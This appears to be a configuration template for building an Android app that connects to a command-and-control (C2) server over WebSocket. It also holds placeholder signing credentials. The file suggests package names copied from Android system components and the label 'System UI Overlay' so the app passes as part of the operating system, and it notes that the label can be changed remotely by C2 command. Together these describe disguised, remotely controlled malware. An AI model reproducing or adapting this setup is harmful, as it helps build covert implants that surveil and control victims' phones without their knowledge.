# ─── COPY THIS FILE TO local.properties AND FILL IN VALUES ───────────────────
# local.properties is in .gitignore — never commit it

# C2 Server (wss:// for production TLS, ws:// for LAN testing only)
C2_URL=wss://YOUR_SERVER_IP_OR_DOMAIN:7771/ws

# APK identity — choose a unique ID that won't conflict with real apps
# Suggestions: com.android.systemui.overlay | com.google.android.settings.overlay
#              com.mediatek.engineermode | com.android.internal.telephony
APP_ID=com.android.systemui.overlay
APP_VERSION_CODE=10205
APP_VERSION_NAME=1.2.5

# App label shown in launcher / settings (can be changed via C2 command too)
APP_LABEL=System UI Overlay

# Keystore — run keytool to generate your own
# keytool -genkey -v -keystore my-release.jks -alias my-key -keyalg RSA -keysize 2048 -validity 10000
KEYSTORE_PATH=../my-release.jks
KEYSTORE_PASS=your_keystore_password
KEY_ALIAS=my-key
KEY_PASS=your_key_password
